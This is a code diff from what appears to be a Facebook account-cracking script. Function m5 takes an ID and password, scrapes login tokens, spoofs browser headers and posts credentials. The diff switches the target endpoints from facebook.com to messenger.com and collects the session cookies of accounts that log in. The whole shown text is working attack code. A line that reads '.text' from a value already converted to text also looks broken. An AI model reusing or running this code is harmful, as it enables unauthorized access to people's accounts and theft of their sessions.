@@ -1147,7 +1147,7 @@ def m5(idf,pw):
     "c": random.randint(10, 30)}
    lgndim = base64.b64encode(urllib.parse.urlencode(dimensions).encode()).decode()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://free.facebook.com').text
+   free_fb = session.get(f'https://m.facebook.com').text
    log_data = {
     'jazoest': re.search('name="jazoest" value="(.*?)"',str(free_fb.text)).group(1),
     'lsd': re.search('name="lsd" value="(.*?)"',str(free_fb.text)).group(1),
@@ -1160,7 +1160,7 @@ def m5(idf,pw):
     'pass': ps,
     'default_persistent': ''}
    header_freefb = {
-    "authority": "m.facebook.com",
+    "authority": "www.messenger.com",
     "method": "POST",
     "path": "/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",
     "scheme": "https",
@@ -1171,7 +1171,7 @@ def m5(idf,pw):
     "Content-Length": "142",
     "Content-Type": "application/x-www-form-urlencoded",
     "Dpr": "1",
-    "Origin": "https://mobile.facebook.com",
+    "Origin": "https://www.messenger.com",
     "Priority": "u=0, i",
     "Referer": "https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
     "Sec-Ch-Prefers-Color-Scheme": "dark",
@@ -1188,7 +1188,7 @@ def m5(idf,pw):
     "Upgrade-Insecure-Requests": "1",
     "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
     "Viewport-Width": "885"} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+   lo = session.post('https://www.messenger.com/login/password/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
